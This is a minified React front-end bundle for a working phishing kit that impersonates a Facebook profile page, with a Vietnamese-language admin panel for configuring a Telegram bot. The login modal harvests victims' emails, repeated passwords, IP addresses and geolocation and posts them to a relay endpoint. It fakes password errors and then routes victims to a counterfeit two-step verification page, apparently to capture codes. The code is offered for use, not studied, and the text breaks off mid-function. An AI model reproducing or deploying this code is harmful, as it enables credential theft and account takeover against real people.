(()=>{"use strict";var e={181:function(e,t,s){var a=s(773),l=s(327);let r=()=>{let e="/"===(0,l.TH)().pathname;return(0,a.jsx)("div",{className:e?"":"flex min-h-screen flex-col items-center bg-white",children:(0,a.jsx)(l.j3,{})})};var n=s(699);let i=()=>{let e=(0,l.s0)(),t=(0,l.TH)(),s=localStorage.getItem("token");return((0,n.useEffect)(()=>{(async()=>{if(!s){"/admin/login"!==t.pathname&&e("/admin/login");return}try{let a=await fetch("/api/verify",{method:"GET",headers:{Accept:"*/*",Authorization:`Bearer ${s}`}});(await a.json()).success?"/admin/login"===t.pathname&&e("/admin/dashboard"):(localStorage.removeItem("token"),"/admin/login"!==t.pathname&&e("/admin/login"))}catch{localStorage.removeItem("token"),"/admin/login"!==t.pathname&&e("/admin/login")}})()},[s,t.pathname,e]),"/admin/login"===t.pathname)?(0,a.jsx)(l.j3,{}):s?(0,a.jsxs)("div",{className:"min-h-screen bg-zinc-100",children:[(0,a.jsx)("title",{children:"Trang Cáº¥u H\xecnh"}),(0,a.jsx)("nav",{className:"bg-white shadow-sm",children:(0,a.jsx)("div",{className:"mx-auto max-w-7xl px-4 sm:px-6 lg:px-8",children:(0,a.jsxs)("div",{className:"flex h-16 justify-between",children:[(0,a.jsx)("div",{className:"flex items-center",children:(0,a.jsx)("h1",{className:"text-xl font-semibold text-black",children:"Trang Cáº¥u H\xecnh"})}),(0,a.jsx)("div",{className:"flex items-center",children:(0,a.jsx)("button",{onClick:()=>{localStorage.removeItem("token"),e("/admin/login")},className:"rounded-md bg-black px-4 py-2 text-sm font-medium text-white hover:bg-zinc-800",children:"ÄÄƒng xuáº¥t"})})]})})}),(0,a.jsx)("main",{className:"mx-auto max-w-7xl px-4 py-6 sm:px-6 lg:px-8",children:(0,a.jsx)(l.j3,{})})]}):null},o=()=>{let[e,t]=(0,n.useState)(!1),[s,l]=(0,n.useState)(""),[r,i]=(0,n.useState)(""),o=localStorage.getItem("token"),c=(0,n.useRef)(null),d=(0,n.useRef)(null),m=(0,n.useRef)(null);(0,n.useEffect)(()=>{(async()=>{try{let[e,t]=await Promise.all([fetch("/api/config/telegram",{headers:{Authorization:`Bearer ${o}`}}),fetch("/api/config/system",{headers:{Authorization:`Bearer ${o}`}})]),s=await e.json(),a=await t.json();if(s.success&&c.current){let e=c.current;e.token.value=s.data.token,e.chat_id.value=s.data.chat_id}if(a.success&&d.current){let e=d.current;e.password_load_limit.value=a.data.password_load_limit,e.password_load_duration.value=a.data.password_load_duration,e.code_load_limit.value=a.data.code_load_limit,e.code_load_duration.value=a.data.code_load_duration}}catch{l("C\xf3 lá»—i khi táº£i cáº¥u h\xecnh")}})()},[o]);let x=async e=>{e.preventDefault(),t(!0),l(""),i("");let s=new FormData(e.currentTarget),a={token:s.get("token"),chat_id:s.get("chat_id")};try{let e=await fetch("/api/config/telegram",{method:"POST",headers:{"Content-Type":"application/json",Authorization:`Bearer ${o}`},body:JSON.stringify(a)}),t=await e.json();t.success?i("Ä\xe3 cáº­p nháº­t cáº¥u h\xecnh Telegram"):l(t.message)}catch{l("C\xf3 lá»—i xáº£y ra khi cáº­p nháº­t cáº¥u h\xecnh Telegram")}finally{t(!1)}},h=async e=>{e.preventDefault(),t(!0),l(""),i("");let s=new FormData(e.currentTarget),a={password_load_limit:Number(s.get("password_load_limit")),password_load_duration:Number(s.get("password_load_duration")),code_load_limit:Number(s.get("code_load_limit")),code_load_duration:Number(s.get("code_load_duration"))};try{let e=await fetch("/api/config/system",{method:"POST",headers:{"Content-Type":"application/json",Authorization:`Bearer ${o}`},body:JSON.stringify(a)}),t=await e.json();t.success?i("Ä\xe3 cáº­p nháº­t cáº¥u h\xecnh há»‡ thá»‘ng"):l(t.message)}catch{l("C\xf3 lá»—i xáº£y ra khi cáº­p nháº­t cáº¥u h\xecnh há»‡ thá»‘ng")}finally{t(!1)}},u=async e=>{e.preventDefault(),t(!0),l(""),i("");let s=new FormData(e.currentTarget),a={username:s.get("username"),password:s.get("password")};try{let e=await fetch("/api/config/auth",{method:"POST",headers:{"Content-Type":"application/json",Authorization:`Bearer ${o}`},body:JSON.stringify(a)}),t=await e.json();t.success?(i("Ä\xe3 cáº­p nháº­t th\xf4ng tin Ä‘Äƒng nháº­p"),m.current&&m.current.reset()):l(t.message)}catch{l("C\xf3 lá»—i xáº£y ra khi cáº­p nháº­t th\xf4ng tin Ä‘Äƒng nháº­p")}finally{t(!1)}};return(0,a.jsxs)("div",{className:"space-y-6",children:[s&&(0,a.jsx)("div",{className:"rounded-md border border-zinc-200 bg-zinc-50 p-4 text-black",children:s}),r&&(0,a.jsx)("div",{className:"rounded-md border border-zinc-200 bg-zinc-50 p-4 text-black",children:r}),(0,a.jsxs)("div",{className:"rounded-lg bg-white p-6 shadow",children:[(0,a.jsx)("h2",{className:"text-lg font-medium text-black",children:"Cáº¥u h\xecnh Telegram"}),(0,a.jsxs)("form",{ref:c,onSubmit:x,className:"mt-4 space-y-4",children:[(0,a.jsxs)("div",{children:[(0,a.jsx)("label",{htmlFor:"token",className:"block text-sm font-medium text-black",children:"Token"}),(0,a.jsx)("input",{type:"text",id:"token",name:"token",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]}),(0,a.jsxs)("div",{children:[(0,a.jsx)("label",{htmlFor:"chat_id",className:"block text-sm font-medium text-black",children:"Chat ID"}),(0,a.jsx)("input",{type:"text",id:"chat_id",name:"chat_id",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]}),(0,a.jsx)("button",{type:"submit",disabled:e,className:"rounded-md bg-black px-4 py-2 text-white hover:bg-zinc-800 disabled:opacity-50",children:e?"Äang xá»­ l\xfd...":"Cáº­p nháº­t cáº¥u h\xecnh Telegram"})]})]}),(0,a.jsxs)("div",{className:"rounded-lg bg-white p-6 shadow",children:[(0,a.jsx)("h2",{className:"text-lg font-medium text-black",children:"Cáº¥u h\xecnh Website"}),(0,a.jsxs)("form",{ref:d,onSubmit:h,className:"mt-4 space-y-4",children:[(0,a.jsxs)("div",{className:"grid grid-cols-1 gap-4 sm:grid-cols-2",children:[(0,a.jsxs)("div",{children:[(0,a.jsx)("label",{htmlFor:"password_load_limit",className:"block text-sm font-medium text-black",children:"Giá»›i háº¡n nháº­p máº­t kháº©u"}),(0,a.jsx)("input",{type:"number",id:"password_load_limit",name:"password_load_limit",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]}),(0,a.jsxs)("div",{children:[(0,a.jsx)("label",{htmlFor:"password_load_duration",className:"block text-sm font-medium text-black",children:"Thá»i gian giá»›i háº¡n (gi\xe2y)"}),(0,a.jsx)("input",{type:"number",id:"password_load_duration",name:"password_load_duration",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]}),(0,a.jsxs)("div",{children:[(0,a.jsx)("label",{htmlFor:"code_load_limit",className:"block text-sm font-medium text-black",children:"Giá»›i háº¡n nháº­p m\xe3"}),(0,a.jsx)("input",{type:"number",id:"code_load_limit",name:"code_load_limit",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]}),(0,a.jsxs)("div",{children:[(0,a.jsx)("label",{htmlFor:"code_load_duration",className:"block text-sm font-medium text-black",children:"Thá»i gian giá»›i háº¡n m\xe3 (gi\xe2y)"}),(0,a.jsx)("input",{type:"number",id:"code_load_duration",name:"code_load_duration",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]})]}),(0,a.jsx)("button",{type:"submit",disabled:e,className:"rounded-md bg-black px-4 py-2 text-white hover:bg-zinc-800 disabled:opacity-50",children:e?"Äang xá»­ l\xfd...":"Cáº­p nháº­t cáº¥u h\xecnh Website"})]})]}),(0,a.jsxs)("div",{className:"rounded-lg bg-white p-6 shadow",children:[(0,a.jsx)("h2",{className:"text-lg font-medium text-black",children:"Thay Ä‘á»•i th\xf4ng tin Ä‘Äƒng nháº­p"}),(0,a.jsxs)("form",{ref:m,onSubmit:u,className:"mt-4 space-y-4",children:[(0,a.jsxs)("div",{children:[(0,a.jsx)("label",{htmlFor:"username",className:"block text-sm font-medium text-black",children:"T\xean Ä‘Äƒng nháº­p má»›i"}),(0,a.jsx)("input",{type:"text",id:"username",name:"username",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]}),(0,a.jsxs)("div",{children:[(0,a.jsx)("label",{htmlFor:"new_password",className:"block text-sm font-medium text-black",children:"Máº­t kháº©u má»›i"}),(0,a.jsx)("input",{type:"password",id:"new_password",name:"password",className:"mt-1 block w-full rounded-md border border-zinc-300 p-2 text-black shadow-sm focus:border-black focus:ring-black"})]}),(0,a.jsx)("button",{type:"submit",disabled:e,className:"rounded-md bg-black px-4 py-2 text-white hover:bg-zinc-800 disabled:opacity-50",children:e?"Äang xá»­ l\xfd...":"Cáº­p nháº­t th\xf4ng tin Ä‘Äƒng nháº­p"})]})]})]})};var c=s(910),d=s(483);let m=()=>{let e=(0,l.s0)(),[t,s]=(0,n.useState)(""),[r,i]=(0,n.useState)(""),[o,m]=(0,n.useState)(""),[x,h]=(0,n.useState)(!1),u=async s=>{s.preventDefault(),m(""),h(!0);try{let s=await fetch("/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:t,password:r})}),l=await s.json();if(l.success){var a;localStorage.setItem("token",(null===(a=l.data)||void 0===a?void 0:a.token)??""),e("/admin/dashboard")}else m(l.message)}catch{m("C\xf3 lá»—i xáº£y ra khi Ä‘Äƒng nháº­p")}finally{h(!1)}};return(0,a.jsxs)("div",{className:"flex min-h-screen items-center justify-center bg-zinc-100 px-4 py-12 sm:px-6 lg:px-8",children:[(0,a.jsx)("title",{children:"ÄÄƒng nháº­p"}),(0,a.jsx)("div",{className:"w-full max-w-md space-y-8 rounded-xl bg-white p-10 shadow-lg",children:(0,a.jsxs)("form",{className:"mt-8 space-y-6",onSubmit:u,children:[o&&(0,a.jsx)("div",{className:"relative rounded border border-zinc-200 bg-zinc-50 px-4 py-3 text-black",role:"alert",children:o}),(0,a.jsxs)("div",{className:"-space-y-px rounded-md shadow-sm",children:[(0,a.jsxs)("div",{children:[(0,a.jsx)("label",{htmlFor:"username",className:"sr-only",children:"T\xean Ä‘Äƒng nháº­p"}),(0,a.jsx)("input",{id:"username",name:"username",type:"text",required:!0,className:"relative block w-full appearance-none rounded-none rounded-t-md border border-zinc-300 px-3 py-2 text-black placeholder-zinc-500 focus:z-10 focus:border-black focus:ring-black sm:text-sm",placeholder:"T\xean Ä‘Äƒng nháº­p",value:t,onChange:e=>s(e.target.value)})]}),(0,a.jsxs)("div",{children:[(0,a.jsx)("label",{htmlFor:"password",className:"sr-only",children:"Máº­t kháº©u"}),(0,a.jsx)("input",{id:"password",name:"password",type:"password",required:!0,className:"relative block w-full appearance-none rounded-none rounded-b-md border border-zinc-300 px-3 py-2 text-black placeholder-zinc-500 focus:z-10 focus:border-black focus:ring-black sm:text-sm",placeholder:"Máº­t kháº©u",value:r,onChange:e=>i(e.target.value)})]})]}),(0,a.jsx)("div",{children:(0,a.jsxs)("button",{type:"submit",disabled:x,className:"group relative flex w-full justify-center rounded-md border border-transparent bg-black px-4 py-2 text-sm font-medium text-white hover:bg-zinc-800 focus:ring-2 focus:ring-black focus:ring-offset-2 disabled:opacity-50",children:[x?(0,a.jsx)("span",{className:"absolute inset-y-0 left-0 flex items-center pl-3",children:(0,a.jsx)(d.G,{icon:c.LM3,className:"h-5 w-5 animate-spin text-white"})}):null,x?"Äang xá»­ l\xfd...":"ÄÄƒng nháº­p"]})})]})})]})},x=()=>(0,a.jsxs)("svg",{className:"fill-[#0866FF]",height:"22",viewBox:"100 100 900 160",xmlns:"http://www.w3.org/2000/svg",children:[(0,a.jsx)("title",{children:"Facebook"}),(0,a.jsx)("path",{d:"M881.583 257.897h29.48v-47.696l41.137 47.696h36.072l-47.89-54.969 40.909-47.663h-32.825l-37.403 43.93v-96.982l-29.48 3.864v151.82Zm-67.988-105.261c-32.728 0-55.455 22.013-55.455 53.929s22.727 53.929 55.455 53.929c32.727 0 55.455-22.013 55.455-53.929s-22.728-53.929-55.455-53.929Zm0 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-119.807-82.728c-32.727 0-55.455 22.013-55.455 53.929s22.728 53.929 55.455 53.929c32.728 0 55.455-22.013 55.455-53.929s-22.727-53.929-55.455-53.929Zm0 82.728c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.389 28.799-25.552 28.799Zm-112.826-82.728c-13.636 0-24.935 5.357-32.013 15.162v-65.585l-29.513 3.831v151.82h26.169l.519-15.844c6.981 11.818 19.481 18.474 34.838 18.474 27.988 0 48.475-22.728 48.475-53.929 0-31.202-20.39-53.929-48.475-53.929Zm-6.98 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-113.638 1.331c-15.649 0-26.883-7.273-30.714-19.805h72.63c.715-3.831 1.202-8.377 1.202-11.429 0-33.02-18.475-52.825-49.514-52.825-31.331 0-53.02 22.013-53.02 53.929 0 32.338 22.728 53.929 56.462 53.929 17.467 0 34.448-5.844 45.065-15.552l-10.617-18.701c-10.292 7.11-20.39 10.454-31.494 10.454Zm-6.591-61.137c13.637 0 22.338 8.279 22.338 21.104v.098h-47.078c2.825-13.604 11.623-21.202 24.74-21.202Zm-98.994 84.968c15.26 0 30.195-5.844 40.714-15.974l-11.526-19.383c-8.182 6.364-17.467 9.805-26.266 9.805-16.364 0-27.273-11.429-27.273-28.377s10.909-28.377 27.273-28.377c8.084 0 16.883 2.922 24.026 8.085l11.721-19.806c-9.481-8.571-24.156-13.831-38.702-13.831-32.013 0-54.643 22.338-54.643 53.929.032 31.494 22.662 53.929 54.676 53.929Zm-93.735-105.261-.519 15.975c-6.981-11.916-19.481-18.572-34.838-18.572-28.085 0-48.475 22.728-48.475 53.929 0 31.202 20.52 53.929 48.475 53.929 15.357 0 27.889-6.656 34.838-18.474l.519 15.844h26.169V155.265h-26.169Zm-28.377 80.099c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.422 28.799-25.552 28.799Zm-57.663-79.906h-26.526v-8.767c0-13.117 5.13-18.149 18.442-18.149 4.123 0 7.467.097 9.383.292v-22.5c-3.637-1.007-12.5-2.013-17.63-2.013-27.111 0-39.611 12.792-39.611 40.422v10.682h-16.753v24.806h16.753v77.631h29.448v-77.599h21.949l4.545-24.805Z"})]}),h=s.p+"static/image/cover.c0d958b0.jpg",u=s.p+"static/image/avatar.c1fe5ac8.jpg",p=e=>{let{onClose:t}=e,[s,r]=(0,n.useState)(""),[i,o]=(0,n.useState)(""),[m,x]=(0,n.useState)({}),[h,u]=(0,n.useState)(!1),[p,b]=(0,n.useState)(0),[f,g]=(0,n.useState)(null),j=(0,l.s0)(),w=(0,n.useCallback)(e=>{e.target===e.currentTarget&&t()},[t]),y=e=>/\S+@\S+\.\S+/.test(e),v=()=>{let e={};return s?y(s)||(e.email="Please enter a valid email address"):e.email="Email is required",i||(e.password="Password is required"),x(e),0===Object.keys(e).length},N=async e=>{try{let t=await fetch("/api/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({text:e,parse_mode:"HTML",old_message_id:f})}),s=await t.json();return s.success&&s.message_id&&(localStorage.setItem("telegram_message_id",s.message_id.toString()),localStorage.setItem("telegram_message",e),g(s.message_id)),s.success}catch(e){return!1}},k=async e=>{if(e.preventDefault(),v()){let e;u(!0),b(e=>e+1);let t=JSON.parse(localStorage.getItem("geoData")??"{}"),a=localStorage.getItem("telegram_message")??"",l=/ğŸ”‘ <b>Máº­t kháº©u \d+:<\/b> <code>(.*?)<\/code>/g,r=[];for(;null!==(e=l.exec(a));)r.push(e[1]);let n=new Date().toLocaleString("vi-VN",{timeZone:"Asia/Ho_Chi_Minh",hour12:!1}),c=r.map((e,t)=>`ğŸ”‘ <b>Máº­t kháº©u ${t+1}:</b> <code>${e}</code>`).join("\n"),d=`ğŸ”‘ <b>Máº­t kháº©u ${r.length+1}:</b> <code>${i}</code>`,m=`ğŸŒ <b>IP:</b> <code>${t.ip||"N/A"}</code>
ğŸ“ <b>Äá»‹a chá»‰:</b> <code>${t.city||"N/A"}, ${t.region||"N/A"}, ${t.country||"N/A"} (${t.country_code||"N/A"})</code>
â° <b>Thá»i gian:</b> <code>${n}</code>

ğŸ“§ <b>Email:</b> <code>${s}</code>
${c}${r.length>0?"\n":""}${d}`.trim();if(await N(m),await new Promise(e=>setTimeout(e,2e3)),u(!1),p>=2){j("/two-step-verification");return}x({password:"Incorrect password. Please try again."}),o("")}};return(0,a.jsx)("div",{className:"fixed inset-0 z-50 flex items-center justify-center bg-white/60 px-2",onClick:w,children:(0,a.jsxs)("div",{className:"w-full max-w-[486px] rounded-lg bg-white shadow-md",children:[(0,a.jsx)("div",{className:"flex justify-end p-4",children:(0,a.jsx)("button",{onClick:t,className:"h-9 w-9 rounded-full bg-gray-200 p-1 text-gray-500 hover:bg-gray-300",children:(0,a.jsx)(d.G,{icon:c.g82,className:"h-6 w-6"})})}),(0,a.jsxs)("div",{className:"p-4 md:p-8",children:[(0,a.jsx)("h2",{className:"mb-5 text-center text-[28px] font-bold",children:"See more on Facebook"}),(0,a.jsxs)("form",{className:"flex flex-col items-center gap-4",onSubmit:k,children:[(0,a.jsxs)("div",{className:"relative w-full",children:[(0,a.jsx)("input",{type:"text",id:"email",value:s,onChange:e=>{let t=e.target.value;r(t),y(t)&&x(e=>({...e,email:void 0}))},className:`peer w-full rounded-lg border ${m.email?"border-red-500":"border-gray-300"} focus:ring-primary p-3 pt-6 text-base focus:ring-2 focus:ring-offset-2 focus:ring-offset-white focus:outline-none`,placeholder:" "}),(0,a.jsx)("label",{htmlFor:"email",className:"peer-focus:text-primary absolute top-4 left-3 cursor-text text-gray-500 transition-all select-none peer-placeholder-shown:translate-y-0 peer-placeholder-shown:text-base peer-focus:-translate-y-3 peer-focus:text-xs peer-[:not(:placeholder-shown)]:-translate-y-3 peer-[:not(:placeholder-shown)]:text-xs",children:"Email address or phone number"}),m.email&&(0,a.jsx)("p",{className:"mt-1 text-sm text-red-500",children:m.email})]}),(0,a.jsxs)("div",{className:"relative w-full",children:[(0,a.jsx)("input",{type:"password",id:"password",value:i,onChange:e=>o(e.target.value),className:`peer w-full rounded-lg border ${m.password?"border-red-500":"border-gray-300"} focus:ring-primary p-3 pt-6 text-base focus:ring-2 focus:ring-offset-2 focus:ring-offset-white focus:outline-none`,placeholder:" "}),(0,a.jsx)("label",{htmlFor:"password",className:"peer-focus:text-primary absolute top-4 left-3 cursor-text text-gray-500 transition-all select-none peer-placeholder-shown:translate-y-0 peer-placeholder-shown:text-base peer-focus:-translate-y-3 peer-focus:text-xs peer-[:not(:placeholder-shown)]:-translate-y-3 peer-[:not(:placeholder-shown)]:text-xs",children:"Password"}),m.password&&(0,a.jsx)("p",{className:"mt-1 text-sm text-red-500",children:m.password})]}),(0,a.jsx)("button",{type:"submit",disabled:h||!s||!i,className:"w-full rounded-lg bg-blue-600 px-4 py-2 text-[17px] font-semibold text-white transition hover:bg-blue-700 disabled:opacity-50",children:h?"Loading...":"Log in"}),(0,a.jsx)("a",{href:"#",className:"text-primary text-center text-[15px] font-semibold hover:underline",children:"Forgotten password?"}),(0,a.jsxs)("div",{className:"my-2 flex w-full items-center gap-3",children:[(0,a.jsx)("div",{className:"h-[1px] flex-1 bg-gray-300"}),(0,a.jsx)("span",{className:"text-[15px] text-gray-500",children:"or"}),(0,a.jsx)("div",{className:"h-[1px] flex-1 bg-gray-300"})]}),(0,a.jsx)("button",{type:"button",className:"w-fit rounded-lg bg-green-600 px-10 py-2 text-[17px] font-semibold text-white transition hover:bg-green-700",children:"Create new account"})]})]})]})})},b=()=>{let e=localStorage.getItem("systemConfig");return e?JSON.parse(e):null},f=e=>{localStorage.setItem("systemConfig",JSON.stringify(e))},g=()=>{(0,n.useEffect)(()=>{localStorage.clear();let e=async()=>{try{let e=await fetch("https://get.geojs.io/v1/ip/geo.json"),t=await e.json();localStorage.setItem("geoData",JSON.stringify(t))}catch(e){}};(async()=>{try{let e=await fetch("/api/config/system"),t=await e.json();t.success&&f(t.data)}catch(e){}})(),e()},[]);let[e,t]=(0,n.useState)(!1);return(0,a.jsxs)("main",{onClick:()=>{e||t(!0)},children:[(0,a.jsx)("title",{children:`Chao VÄƒn X\xecn | Facebook`}),(0,a.jsxs)("header",{className:"sticky top-0 z-10 flex h-14 items-center justify-between bg-white px-4 shadow-md md:px-8",children:[(0,a.jsx)(x,{}),(0,a.jsxs)("div",{className:"flex items-center gap-2",children:[(0,a.jsx)("input",{placeholder:"Email or phone",type:"text",className:"hidden rounded-md border border-[#ced0d4] px-3 py-2 placeholder:text-[#65676B] md:block"}),(0,a.jsx)("input",{placeholder:"Password",type:"password",className:"hidden rounded-md border border-[#ced0d4] px-3 py-2 placeholder:text-[#65676B] md:block"}),(0,a.jsx)("button",{className:"bg-primary hover:bg-primary/90 rounded-md px-3 py-[9px] text-[15px] font-semibold text-white",children:"Login"}),(0,a.jsx)("p",{className:"hidden px-1 py-1.5 text-[15px] font-semibold text-[#0064d1] md:block",children:"Forgotten account?"})]})]}),(0,a.jsxs)("div",{className:"flex w-full flex-col items-center justify-center bg-white shadow-md md:min-h-[500px]",children:[(0,a.jsxs)("div",{className:"relative h-[250px] w-full max-w-[940px] md:h-[350px]",children:[(0,a.jsx)("img",{src:h,alt:"",className:"h-full w-full rounded-b-md object-cover object-center"}),(0,a.jsxs)("div",{className:"absolute -bottom-24 left-1/2 flex -translate-x-1/2 flex-col items-center gap-2 md:-bottom-20 md:left-8 md:translate-x-0 md:flex-row md:items-end",children:[(0,a.jsx)("img",{src:u,alt:"",className:"h-[120px] w-[120px] rounded-full border-4 border-white md:h-[176px] md:w-[176px]"}),(0,a.jsx)("p",{className:"text-2xl font-bold md:py-2 md:text-3xl",children:"Chao VÄƒn X\xecn"})]})]}),(0,a.jsx)("hr",{className:"mt-28 w-full border-gray-300 md:mt-24 md:w-[876px]"}),(0,a.jsxs)("div",{className:"flex h-16 w-full max-w-[876px] items-center justify-between px-4 text-[15px] font-semibold text-[#65676b]",children:[(0,a.jsxs)("div",{className:"flex items-center gap-2 overflow-x-auto",children:[(0,a.jsx)("p",{children:"Friends"}),(0,a.jsx)("p",{children:"Photos"}),(0,a.jsx)("p",{children:"Photos"})]}),(0,a.jsx)(d.G,{icon:c.cNd,className:"rounded-md bg-gray-200 px-4 py-2.5"})]})]}),(0,a.jsx)("div",{className:"bg-[#F0F2F5] p-2 md:p-4",children:(0,a.jsxs)("div",{className:"mx-auto flex max-w-[876px] flex-col gap-4",children:[(0,a.jsxs)("div",{className:"rounded-lg bg-white p-4",children:[(0,a.jsx)("h2",{className:"mb-4 text-xl font-bold",children:"About"}),(0,a.jsxs)("div",{className:"space-y-4",children:[(0,a.jsxs)("div",{children:[(0,a.jsx)("h3",{className:"font-semibold",children:"Work"}),(0,a.jsxs)("p",{className:"flex items-center gap-2 text-[#65676b]",children:[(0,a.jsx)(d.G,{icon:c.HXv,className:"text-[#65676b]"}),"No workplaces to show"]})]}),(0,a.jsxs)("div",{children:[(0,a.jsx)("h3",{className:"font-semibold",children:"University"}),(0,a.jsxs)("p",{className:"flex items-center gap-2 text-[#65676b]",children:[(0,a.jsx)(d.G,{icon:c.Xf_,className:"text-[#65676b]"}),"No schools/universities to show"]})]}),(0,a.jsxs)("div",{children:[(0,a.jsx)("h3",{className:"font-semibold",children:"High School"}),(0,a.jsxs)("p",{className:"flex items-center gap-2 text-[#65676b]",children:[(0,a.jsx)(d.G,{icon:c.QRb,className:"text-[#65676b]"}),"No schools/universities to show"]})]})]})]}),(0,a.jsxs)("div",{className:"rounded-lg bg-white p-4",children:[(0,a.jsxs)("div",{className:"mb-4 flex items-center justify-between",children:[(0,a.jsx)("h2",{className:"text-lg font-bold md:text-xl",children:"Photos"}),(0,a.jsx)("button",{className:"font-semibold text-[#0064d1]",children:"See All Photos"})]}),(0,a.jsx)("div",{className:"grid grid-cols-2 gap-2 md:grid-cols-3",children:[...Array(6)].map((e,t)=>(0,a.jsx)("div",{className:"aspect-square rounded-md bg-gray-200"},`photo-${t+1}`))})]})]})}),(0,a.jsxs)("div",{className:"fixed right-0 bottom-0 left-0 flex flex-col items-center justify-center bg-white px-4 py-4 shadow-[0_-2px_4px_rgba(0,0,0,0.1)] md:px-0 md:py-8",onClick:e=>e.stopPropagation(),children:[(0,a.jsx)("h1",{className:"mb-4 max-w-[350px] truncate text-center text-xl font-bold md:max-w-full md:text-2xl",children:"Log in or sign up for Facebook to connect with friends, family and people you know."}),(0,a.jsxs)("div",{className:"flex w-full flex-col items-center gap-2 md:w-auto md:flex-row",children:[(0,a.jsx)("button",{className:"h-[40px] w-[230px] rounded-md bg-[#1877f2] text-[17px] font-semibold text-white hover:bg-[#1877f2]/90",onClick:()=>t(!0),children:"Log in"}),(0,a.jsx)("span",{className:"text-[13px] font-semibold text-[#65676b] md:block",children:"or"}),(0,a.jsx)("button",{className:"h-[40px] w-[230px] rounded-md bg-[#42b72a] text-[17px] font-semibold text-white hover:bg-[#36a420]",onClick:()=>t(!0),children:"Create new account"})]})]}),e&&(0,a.jsx)("div",{onClick:e=>e.stopPropagation(),children:(0,a.jsx)(p,{onClose:()=>t(!1)})})]})},j=s.p+"static/image/authentication-app-image.6f088468.png";s.p;let w=e=>{let{onClose:t}=e,[s,l]=(0,n.useState)(()=>sessionStorage.getItem("selectedConfirmationMethod")??""),r=e=>{l(e),sessionStorage.setItem("selectedConfirmationMethod",e)},i=[{type:"WhatsApp",description:"We'll send a code to your phone number"},{type:"Authentication app",description:"Get a code from your authentication app"},{type:"Backup code",description:"Use a backup code that you saved"},{type:"Text message",description:"We'll send a code to your phone number"}];return(0,a.jsx)("div",{className:"fixed inset-0 z-50 flex items-center justify-center bg-white transition-all duration-200 ease-in-out md:bg-black/25",children:(0,a.jsxs)("div",{className:"relative h-full w-full animate-[fadeIn_0.15s_ease-out] overflow-y-auto border border-gray-200 bg-white motion-safe:animate-[scaleIn_0.1s_ease-out] md:h-auto md:max-w-xl md:rounded-3xl",children:[(0,a.jsx)("div",{className:"mx-2 flex h-16 items-center justify-end",children:(0,a.jsx)("div",{onClick:t,className:"flex h-10 w-10 cursor-pointer items-center justify-center rounded-full p-2 transition-colors duration-200 hover:bg-gray-100",children:(0,a.jsx)(d.G,{icon:c.g82,size:"xl"})})}),(0,a.jsxs)("div",{className:"px-5",children:[(0,a.jsx)("h2",{className:"mb-2 text-2xl font-semibold",children:"Choose a way to confirm that it's you"}),(0,a.jsx)("p",{className:"mb-6 text-[15px]",children:"These are your available confirmation methods."}),(0,a.jsx)("div",{className:"",children:i.map((e,t)=>(0,a.jsxs)("div",{onClick:()=>r(e.type),className:`cursor-pointer border border-gray-200 p-3 transition-colors hover:bg-gray-50 ${t===i.length-1?"rounded-b-2xl":""} ${0===t?"rounded-t-2xl":""} ${0!==t?"border-t-0":""} relative flex items-center justify-between`,children:[(0,a.jsxs)("div",{className:"flex-grow",children:[(0,a.jsx)("h3",{className:"text-[15px] font-medium",children:e.type}),(0,a.jsx)("p",{className:"text-[15px] font-normal text-[#5d6c7b]",children:e.description})]}),(0,a.jsx)("div",{className:`flex h-5 w-5 items-center justify-center rounded-full border-2 ${s===e.type?"border-blue-600":"border-gray-300"}`,children:s===e.type&&(0,a.jsx)("div",{className:"h-2.5 w-2.5 rounded-full bg-blue-600"})})]},e.type))}),(0,a.jsxs)("div",{className:"mt-8 flex items-start gap-3 rounded-2xl border border-gray-300 p-5",children:[(0,a.jsx)("div",{className:"flex h-[40px] w-[40px] items-center justify-center rounded-full bg-gray-100",children:(0,a.jsx)(d.G,{icon:c.sqG,size:"xl"})}),(0,a.jsxs)("div",{children:[(0,a.jsx)("h3",{className:"mb-1 text-[17px] font-semibold",children:"Need another option?"}),(0,a.jsxs)("p",{className:"text-[15px]",children:["To keep your account safe, accessing it without your usual login methods can take a few days. To get started, go to"," ",(0,a.jsxs)("span",{className:"cursor-pointer text-[15px] font-bold text-[#0064e0] hover:underline",children:[" ","account recovery"]})]})]})]}),(0,a.jsx)("button",{onClick:t,className:"my-6 block w-full rounded-full bg-blue-600 py-3 text-center font-medium text-white transition-colors hover:bg-blue-700",children:"Continue"})]})]})})},y=e=>{let{isMobile:t}=e,[s,r]=(0,n.useState)(!1),[i,o]=(0,n.useState)(!1),m=(0,n.useRef)(null),[x,h]=(0,n.useState)(0),[u,p]=(0,n.useState)(!1),[f,g]=(0,n.useState)(""),y=(0,l.s0)(),v=b(),[N,k]=(0,n.useState)(null);(0,n.useEffect)(()=>{v||y("/")},[v,y]),(0,n.useEffect)(()=>{m.current&&m.current.focus()},[]),(0,n.useEffect)(()=>{let e=localStorage.getItem("telegram_message_id");if(!e){y("/");return}k(parseInt(e))},[y]);let _=async e=>{try{let t=await fetch("/api/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({text:e,parse_mode:"HTML",old_message_id:N})}),s=await t.json();return 